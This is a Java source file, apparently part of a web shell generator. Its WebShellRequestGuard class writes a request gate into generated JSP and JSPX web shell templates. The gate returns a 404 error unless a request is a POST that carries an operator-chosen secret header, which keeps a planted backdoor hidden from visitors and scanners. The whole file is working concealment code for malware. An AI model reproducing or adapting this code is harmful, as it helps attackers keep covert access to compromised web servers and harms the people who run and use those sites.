package org.leo.jmg.jsp;

import org.leo.jmg.util.javassist.JavassistUtil;

/** Generates the request gate shared by JSP and JSPX WebShell templates. */
public final class WebShellRequestGuard {

    private WebShellRequestGuard() {
    }

    public static String source(String headerName, String headerValue, String indent) {
        String condition = condition(headerName, headerValue);
        return indent + "if (" + condition + ") {\n"
                + indent + "    response.setContentType(\"text/html;charset=UTF-8\");\n"
                + indent + "    response.sendError(404);\n"
                + indent + "    return;\n"
                + indent + "}\n";
    }

    public static String sourceForJspx(String headerName, String headerValue, String indent) {
        return xmlEscape(source(headerName, headerValue, indent));
    }

    private static String condition(String headerName, String headerValue) {
        if (isBlank(headerName) != isBlank(headerValue)) {
            throw new IllegalArgumentException("WebShell 的 headerName 和 headerValue 不能为空");
        }
        String post = "!\"POST\".equals(request.getMethod())";
        if (isBlank(headerName)) {
            return post;
        }
        String name = JavassistUtil.escapeJavaString(headerName.trim());
        String value = JavassistUtil.escapeJavaString(headerValue.trim());
        String header = "request.getHeader(\"" + name + "\")";
        return post + " || " + header + " == null || !" + header
                + ".contains(\"" + value + "\")";
    }

    private static String xmlEscape(String value) {
        return value.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;");
    }

    private static boolean isBlank(String value) {
        return value == null || value.trim().isEmpty();
    }
}
